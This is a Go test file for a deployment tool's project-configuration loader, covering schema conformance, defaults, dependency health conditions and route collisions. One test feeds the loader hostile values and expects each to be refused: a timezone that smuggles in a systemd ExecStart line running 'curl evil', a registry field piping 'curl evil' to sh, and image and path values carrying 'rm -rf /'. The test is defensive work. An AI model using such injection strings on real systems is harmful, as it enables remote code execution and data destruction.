package app

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

const base = "api_version: onebox.run/v1\napp: ledger\nenvironments: {production: {server: root@1.2.3.4}}\n"
const min = base + "build: .\ndomain: ledger.example.com\nport: 8080\n"

func wl(body string) string { return base + "workloads: {" + body + "}\n" }

type conformanceCase struct {
	name string
	yaml string
	ok   bool
}

// conformanceCases is the corpus recorded in the change's conformance.md. It is
// a function so the equivalence harness can freeze a verdict for every case
// without keeping a second copy of the list.
func conformanceCases() []conformanceCase {
	return []conformanceCase{
		{"minimum project", min, true},
		{"explicit workloads block", wl("web: {image: nginx}"), true},
		{"one-char identifier", "api_version: onebox.run/v1\napp: a\nenvironments: {p: {server: h}}\nimage: nginx\n", true},
		{"app starting ob-", "api_version: onebox.run/v1\napp: ob-proxy\nenvironments: {p: {server: h}}\nimage: nginx\n", false},
		{"underscore identifier", "api_version: onebox.run/v1\napp: my_app\nenvironments: {p: {server: h}}\nimage: nginx\n", false},
		{"unknown top-level field", min + "bogus: 1\n", false},
		{"x- extension accepted", min + "x-note: anything\n", true},
		{"port out of range", base + "image: nginx\ndomain: d\nport: 70000\n", false},
		{"zero replicas", wl("w: {image: nginx, replicas: 0}"), false},
		{"job requires data_effect", wl("j: {image: nginx, role: job}"), false},
		{"job with data_effect", wl("j: {image: nginx, role: job, data_effect: none}"), true},
		{"job data_effect unknown", wl("j: {image: nginx, role: job, data_effect: unknown}"), true},
		{"application with data_effect", wl("w: {image: nginx, data_effect: none}"), false},
		{"application with run", wl("w: {image: nginx, run: manual}"), false},
		{"worker with schedule", wl("w: {image: nginx, role: worker, schedule: {cron: \"0 3 * * *\"}}"), false},
		{"scheduled job", wl("j: {image: nginx, role: job, data_effect: none, schedule: {cron: \"0 4 * * *\"}}"), true},
		{"daemon role", wl("db: {image: postgres:16, role: daemon}"), true},
		{"routes list", wl("w: {image: nginx, routes: [{domain: x, port: 4317, protocol: tcp, scheme: h2c}]}"), true},
		{"bad protocol", wl("w: {image: nginx, routes: [{domain: x, port: 1, protocol: udp}]}"), false},
		{"absolute compose ref", wl("w: {compose: \"/etc/compose.yml#web\"}"), false},
		{"relative compose ref", wl("w: {compose: \"compose.yaml#web\"}"), true},
		{"absolute env_file", min + "runtime: {env_files: [/etc/x.env]}\n", false},
		{"relative env_file", min + "runtime: {env_files: [.env.production]}\n", true},
		{"base_path absolute", min + "base_path: /mnt/data/ob\n", true},
		{"duration in days", "api_version: onebox.run/v1\napp: a\nimage: nginx\nenvironments: {p: {server: h, policy: {migration_backup_max_age: 14d}}}\n", true},
		{"non-calver minimum version", "api_version: onebox.run/v1\napp: a\nimage: nginx\nenvironments: {p: {server: h, policy: {minimum_onebox_version: 0.0.1-m0}}}\n", false},
		{"incomplete plan schema", "api_version: onebox.run/v1\napp: a\nimage: nginx\nenvironments: {p: {server: h, policy: {minimum_plan_schema: \"onebox.run/executable-deploy-plan/v1alpha\"}}}\n", false},
		{"hook with local", min + "hooks: {pre_release: {run: scripts/build.sh, local: true}}\n", true},
		{"protection is no longer a field", wl("w: {image: nginx, protection: {backup: {schedule: {cron: \"0 3 * * *\"}}}}"), false},
		{"a near-miss field name", wl("w: {image: nginx, replicaz: 3}"), false},
		{"secret as scalar path", min + "secrets: {production: secrets.yaml}\n", true},
		{"verification workload without probe", min + "verification: [{workload: ledger}]\n", false},
		{"verification url with exec", min + "verification: [{url: \"https://x/\", exec: \"echo\"}]\n", false},
		{"verification url contains advisory", min + "verification: [{url: \"https://x/\", contains: \"<div\", advisory: true}]\n", true},
		{"status code 600", min + "verification: [{url: \"https://x/\", status_codes: [600]}]\n", false},
		// `kind: none` says nothing routes. A project that also declares a
		// route is asking for something nobody would serve.
		{"proxy kind none without a route", wl("web: {image: nginx}") + "proxy: {kind: none}\n", true},
		{"proxy kind none with a route", min + "proxy: {kind: none}\n", false},
		// `managed: false` says an operator runs the proxy themselves. The
		// routes are still real and still need their labels.
		{"unmanaged proxy keeps its routes", min + "proxy: {managed: false}\n", true},
		{"migration_policy expand-only", min + "deployment: {migration_policy: expand-only}\n", true},
		{"persistence external", wl("w: {image: nginx, persistence: {mode: external}}"), true},
		{"volume scalar without a path", wl("w: {image: nginx, volumes: [data]}"), false},
		{"volume scalar with a path", wl("w: {image: nginx, volumes: [{name: data, path: /data}]}"), true},
		{"bind mount volume", wl("w: {image: nginx, volumes: [{source: ./data, target: /data}]}"), true},
		{"published udp port", wl("w: {image: nginx, ports: [{host: 8555, container: 8555, protocol: udp}]}"), true},
		{"service scalar", min + "services: {postgres: 18}\n", true},

		// Loader-enforced: the schema alone accepts these.
		{"no environments", "api_version: onebox.run/v1\napp: a\nenvironments: {}\nimage: nginx\n", false},
		{"no workload source at all", base, false},
		{"shorthand and workloads together", min + "workloads: {w: {image: nginx}}\n", false},
		{"two sources on a workload", wl("w: {image: nginx, build: .}"), false},
		{"domain without port", wl("w: {image: nginx, domain: x.com}"), false},
		{"domain and routes together", wl("w: {image: nginx, domain: x.com, port: 1, routes: [{domain: y, port: 2}]}"), false},
		{"workload and service share a name", wl("db: {image: nginx}") + "services: {db: 18}\n", false},
		{"unknown prerequisite", wl("w: {image: nginx, needs: [ghost]}"), false},
		{"components is not a field", "api_version: onebox.run/v1\napp: a\nenvironments: {p: {server: h}}\ncomponents: {web: {type: application}}\n", false},
		{"missing api_version", "app: a\nenvironments: {p: {server: h}}\nimage: nginx\n", false},
	}
}

// TestConformance is that corpus. A divergence here is a defect in the
// implementation, not in the corpus.
func TestConformance(t *testing.T) {
	for _, c := range conformanceCases() {
		t.Run(c.name, func(t *testing.T) {
			_, err := LoadBytes([]byte(c.yaml), "ob.yml")
			if c.ok && err != nil {
				t.Fatalf("expected accept, got %v", err)
			}
			if !c.ok && err == nil {
				t.Fatal("expected reject, got accept")
			}
			if err != nil {
				var e *Error
				if !asError(err, &e) {
					t.Fatalf("error is not typed: %T", err)
				}
				if e.Code == "" {
					t.Fatal("typed error has no code")
				}
			}
		})
	}
}

// TestDefaultsMaterialise guards the CUE rule that cost a review round: a
// default on an optional field never appears in output.
func TestDefaultsMaterialise(t *testing.T) {
	p, err := LoadBytes([]byte(min), "ob.yml")
	if err != nil {
		t.Fatal(err)
	}
	if p.BasePath != "/var/lib/ob" {
		t.Errorf("base_path = %q, want /var/lib/ob", p.BasePath)
	}
	if p.Proxy.Network != "ob-ingress" {
		t.Errorf("proxy.network = %q, want ob-ingress", p.Proxy.Network)
	}
	if p.Deployment.RetainReleases != 5 {
		t.Errorf("retain_releases = %d, want 5", p.Deployment.RetainReleases)
	}
	if !p.Environments["production"].Policy.RequireApproval {
		t.Error("policy.require_approval should default to true")
	}
	w, ok := p.Workloads["ledger"]
	if !ok {
		t.Fatalf("shorthand did not expand into a workload named for the app: %v", keysOf(p.Workloads))
	}
	if w.Role != "application" {
		t.Errorf("role = %q, want application", w.Role)
	}
	if w.Replicas != 1 {
		t.Errorf("replicas = %d, want 1", w.Replicas)
	}
	if w.Strategy != "rolling" {
		t.Errorf("strategy = %q, want rolling", w.Strategy)
	}
}

// TestNeedsGateOnHealthWhenThereIsHealthToGateOn. Ten real projects gate on
// healthy — but only where the dependency has a health check to reach.
func TestNeedsGateOnHealthWhenThereIsHealthToGateOn(t *testing.T) {
	p, err := LoadBytes([]byte(wl(`w: {image: nginx, needs: [db]}, db: {image: "postgres:16", role: daemon, health: {exec: "pg_isready"}}`)), "ob.yml")
	if err != nil {
		t.Fatal(err)
	}
	needs := p.Workloads["w"].Needs
	if len(needs) != 1 || needs[0].Name != "db" || needs[0].Condition != "healthy" {
		t.Fatalf("needs = %+v, want one healthy-gated db", needs)
	}
}

// TestPublishedPortBindsLoopback: exposure on every interface must be deliberate.
func TestPublishedPortBindsLoopback(t *testing.T) {
	p, err := LoadBytes([]byte(wl("w: {image: nginx, ports: [{host: 8000, container: 8000}]}")), "ob.yml")
	if err != nil {
		t.Fatal(err)
	}
	got := p.Workloads["w"].Ports[0]
	if got.Bind != "127.0.0.1" || got.Protocol != "tcp" {
		t.Fatalf("port = %+v, want loopback tcp", got)
	}
}

// TestOverLongNameRefused: names are refused, never truncated, because a
// truncating scheme is not injective and volume names are permanent.
func TestOverLongNameRefused(t *testing.T) {
	long := strings.Repeat("a", 40)
	y := "api_version: onebox.run/v1\napp: " + long + "\nenvironments: {p: {server: h}}\n" +
		"workloads: {" + strings.Repeat("w", 30) + ": {image: nginx}}\n"
	_, err := LoadBytes([]byte(y), "ob.yml")
	if err == nil {
		t.Fatal("expected an over-long derived name to be refused")
	}
	var e *Error
	if !asError(err, &e) || e.Code != "derived_name_too_long" {
		t.Fatalf("got %v, want derived_name_too_long", err)
	}
}

// TestConversionDrafts loads every draft recorded for tasks 1.1-1.3. These are
// real projects: five here and eight open-source.
func TestConversionDrafts(t *testing.T) {
	dir := filepath.Join("..", "..", "openspec", "changes",
		"adopt-declarative-project-schema", "conversions")
	files, err := filepath.Glob(filepath.Join(dir, "*.yml"))
	if err != nil || len(files) == 0 {
		t.Skipf("no conversion drafts found in %s", dir)
	}
	for _, f := range files {
		t.Run(strings.TrimSuffix(filepath.Base(f), ".yml"), func(t *testing.T) {
			b, err := os.ReadFile(f)
			if err != nil {
				t.Fatal(err)
			}
			p, err := LoadBytes(b, f)
			if err != nil {
				t.Fatalf("draft should load: %v", err)
			}
			if p.Name == "" || len(p.Workloads) == 0 {
				t.Fatalf("draft normalised to an empty project")
			}
		})
	}
}

func asError(err error, target **Error) bool {
	e, ok := err.(*Error)
	if ok {
		*target = e
	}
	return ok
}

func keysOf[V any](m map[string]V) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	return out
}

// TestNeedConditionResolvesAgainstTheDependency.
//
// Found by deploying: `needs` defaulted to `healthy`, and Compose refuses to
// start a runtime that waits on a dependency with no health check —
// "dependency failed to start: container has no healthcheck configured". A
// default must not describe something the container engine cannot do.
func TestNeedConditionResolvesAgainstTheDependency(t *testing.T) {
	y := `api_version: onebox.run/v1
app: app
environments: {production: {server: h}}
workloads:
  web: {role: application, image: nginx, needs: [db, sidecar]}
  db: {role: daemon, image: postgres, health: {exec: "pg_isready"}}
  sidecar: {role: daemon, image: busybox}
`
	p, err := LoadBytes([]byte(y), "ob.yml")
	if err != nil {
		t.Fatal(err)
	}
	got := map[string]string{}
	for _, n := range p.Workloads["web"].Needs {
		got[n.Name] = n.Condition
	}
	if got["db"] != "healthy" {
		t.Errorf("a dependency with a health check should be waited on for health, got %q", got["db"])
	}
	if got["sidecar"] != "started" {
		t.Errorf("a dependency without one cannot become healthy, got %q", got["sidecar"])
	}
}

// TestExplicitHealthyOnAHealthlessDependencyIsRefused: a default may be
// softened, but an explicit request must be honoured or refused — never
// quietly turned into something weaker.
func TestExplicitHealthyOnAHealthlessDependencyIsRefused(t *testing.T) {
	y := `api_version: onebox.run/v1
app: app
environments: {production: {server: h}}
workloads:
  web: {role: application, image: nginx, needs: [{name: sidecar, condition: healthy}]}
  sidecar: {role: daemon, image: busybox}
`
	_, err := LoadBytes([]byte(y), "ob.yml")
	var e *Error
	if !asError(err, &e) || e.Code != "prerequisite_has_no_health" {
		t.Fatalf("got %v, want prerequisite_has_no_health", err)
	}
}

// Two workloads on one address is an outage nobody can explain: the proxy
// accepts both and routes to one, chosen by a rule the author never wrote.
func TestRouteCollisionIsRefusedNamingBoth(t *testing.T) {
	_, err := LoadBytes([]byte(`api_version: onebox.run/v1
app: shop
environments: {production: {server: root@h}}
workloads:
  web:    {role: application, image: x:1, domain: shop.example.com, port: 80}
  legacy: {role: application, image: y:1, domain: shop.example.com, port: 90}
`), "ob.yml")
	if err == nil {
		t.Fatal("two workloads claiming one address must be refused")
	}
	msg := err.Error()
	if !strings.Contains(msg, "legacy") || !strings.Contains(msg, "web") {
		t.Fatalf("the refusal must name both workloads: %v", err)
	}
}

// The same host on two listeners is how a project serves HTTP and gRPC side by
// side. Refusing that would reject correct projects.
func TestSameHostOnDistinctEntrypointsIsAllowed(t *testing.T) {
	_, err := LoadBytes([]byte(`api_version: onebox.run/v1
app: shop
environments: {production: {server: root@h}}
workloads:
  web:
    role: application
    image: x:1
    routes:
      - {domain: shop.example.com, path: /, port: 80, entrypoint: websecure}
  grpc:
    role: application
    image: y:1
    routes:
      - {domain: shop.example.com, path: /, port: 90, entrypoint: grpc, scheme: h2c}
`), "ob.yml")
	if err != nil {
		t.Fatalf("distinct entrypoints are distinct addresses: %v", err)
	}
}

// Different paths on one host are distinct addresses too.
func TestSameHostDifferentPathsIsAllowed(t *testing.T) {
	_, err := LoadBytes([]byte(`api_version: onebox.run/v1
app: shop
environments: {production: {server: root@h}}
workloads:
  web: {role: application, image: x:1, routes: [{domain: shop.example.com, path: /, port: 80}]}
  api: {role: application, image: y:1, routes: [{domain: shop.example.com, path: /api, port: 90}]}
`), "ob.yml")
	if err != nil {
		t.Fatalf("distinct paths are distinct addresses: %v", err)
	}
}

// `kind` is what routes; `managed` is who runs it. Conflating them meant
// `managed: false` silently threw the routes away, and a project that declared
// a domain deployed something nothing could reach.
func TestRoutesSurviveAnUnmanagedProxy(t *testing.T) {
	spec, err := LoadBytes([]byte(`api_version: onebox.run/v1
app: shop
environments: {production: {server: root@h}}
workloads:
  web: {role: application, image: x:1, domain: shop.example.com, port: 80}
proxy: {managed: false}
`), "ob.yml")
	if err != nil {
		t.Fatal(err)
	}
	r, err := spec.Resolve("production")
	if err != nil {
		t.Fatal(err)
	}
	out, err := r.Render("production", "R1", nil)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(out.Bytes), "traefik.enable") {
		t.Fatalf("an operator running their own Traefik still needs the labels:\n%s", out.Bytes)
	}
}

// With nothing to route, a declared route is a promise nobody keeps.
func TestRouteWithoutAProxyIsRefused(t *testing.T) {
	_, err := LoadBytes([]byte(`api_version: onebox.run/v1
app: shop
environments: {production: {server: root@h}}
workloads:
  web: {role: application, image: x:1, domain: shop.example.com, port: 80}
proxy: {kind: none}
`), "ob.yml")
	if err == nil {
		t.Fatal("a route with no proxy must be refused")
	}
	if !strings.Contains(err.Error(), "nothing would route it") {
		t.Fatalf("the refusal must say why: %v", err)
	}
}

// A schema that claims to be closed and is not is worse than an open one: the
// error people rely on never comes. `#Source` was a disjunction of open
// branches, and that openness propagated into every workload.
func TestUnknownWorkloadFieldIsRefusedForEveryRole(t *testing.T) {
	for _, role := range []string{
		"role: application, image: nginx",
		"role: worker, image: nginx",
		"role: daemon, image: nginx",
		"role: job, image: nginx, data_effect: none",
	} {
		_, err := LoadBytes([]byte("api_version: onebox.run/v1\napp: a\nenvironments: {p: {server: h}}\n"+
			"workloads: {w: {"+role+", replicaz: 3}}\n"), "ob.yml")
		if err == nil {
			t.Errorf("%s: an unknown field must be refused", role)
			continue
		}
		msg := err.Error()
		// The failure must name the field that is wrong, not the role. A
		// workload is a disjunction over four roles, and reporting whichever
		// branch the validator tried first sends the author to fix the one
		// field that was right.
		if !strings.Contains(msg, "replicaz") {
			t.Errorf("%s: the failure must name the field: %v", role, err)
		}
		if strings.Contains(msg, "conflicting values") {
			t.Errorf("%s: the failure must not blame the role: %v", role, err)
		}
		if !strings.Contains(msg, `did you mean "replicas"?`) {
			t.Errorf("%s: a near miss should be suggested: %v", role, err)
		}
		// Nobody writing a project knows what a workloadWorker is.
		if strings.Contains(msg, "workloadWorker") || strings.Contains(msg, "workloadApplication") {
			t.Errorf("%s: the validator's own vocabulary leaked: %v", role, err)
		}
	}
}

// Hostile values in fields that reach a generated file or a generated command.
// The project file is not a trust boundary — anyone who can edit it can already
// deploy — but it is reviewed, and a value that reads as a timezone while
// appending a root command to a scheduling unit defeats the review.
func TestHostileValuesAreRefusedAtTheGrammar(t *testing.T) {
	base := "api_version: onebox.run/v1\napp: a\nenvironments: {p: {server: h}}\n"
	for _, tt := range []struct{ name, yaml string }{
		{"timezone injecting a unit directive",
			base + `workloads: {w: {role: application, image: x:1}, j: {role: job, image: x:1, data_effect: none,` +
				` schedule: {cron: "0 2 * * *", timezone: "UTC\n[Service]\nExecStart=/bin/sh -c 'curl evil'"}}}` + "\n"},
		{"registry server with a command",
			base + "workloads: {w: {role: application, image: x:1}}\nregistries: {r: {server: \"ghcr.io; curl evil | sh\"}}\n"},
		{"image reference with a command",
			base + "workloads: {w: {role: application, image: \"x:1; rm -rf /\"}}\n"},
		{"base path with a quote",
			base + "workloads: {w: {role: application, image: x:1}}\nbase_path: \"/var/lib/ob'; rm -rf /; '\"\n"},
		{"env file path with a newline",
			base + "workloads: {w: {role: application, image: x:1, env_files: [\"a.env\\nb\"]}}\n"},
		{"health path with a quote",
			base + "workloads: {w: {role: application, image: x:1, health: {http: \"/x\\\"y\", port: 80}}}\n"},
	} {
		if _, err := LoadBytes([]byte(tt.yaml), "ob.yml"); err == nil {
			t.Errorf("%s: must be refused", tt.name)
		}
	}
}

// The same fields must still accept what real projects write.
func TestOrdinaryValuesStillLoad(t *testing.T) {
	base := "api_version: onebox.run/v1\napp: a\nenvironments: {p: {server: h}}\n"
	for _, tt := range []struct{ name, yaml string }{
		{"IANA timezone",
			base + `workloads: {w: {role: application, image: x:1}, j: {role: job, image: x:1, data_effect: none,` +
				` schedule: {cron: "0 2 * * *", timezone: "America/Argentina/Buenos_Aires"}}}` + "\n"},
		{"registry with a port",
			base + "workloads: {w: {role: application, image: x:1}}\nregistries: {r: {server: \"registry.example.com:5000\", username: bot}}\n"},
		{"digest-pinned image",
			base + "workloads: {w: {role: application, image: \"ghcr.io/acme/app:v1.2.3@sha256:" + "ab" + "cdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789\"}}\n"},
		{"nested env file",
			base + "workloads: {w: {role: application, image: x:1, env_files: [\"config/prod/.env\"]}}\n"},
		{"health path with a query-free route",
			base + "workloads: {w: {role: application, image: x:1, health: {http: /health/ready, port: 80}}}\n"},
	} {
		if _, err := LoadBytes([]byte(tt.yaml), "ob.yml"); err != nil {
			t.Errorf("%s: must load: %v", tt.name, err)
		}
	}
}
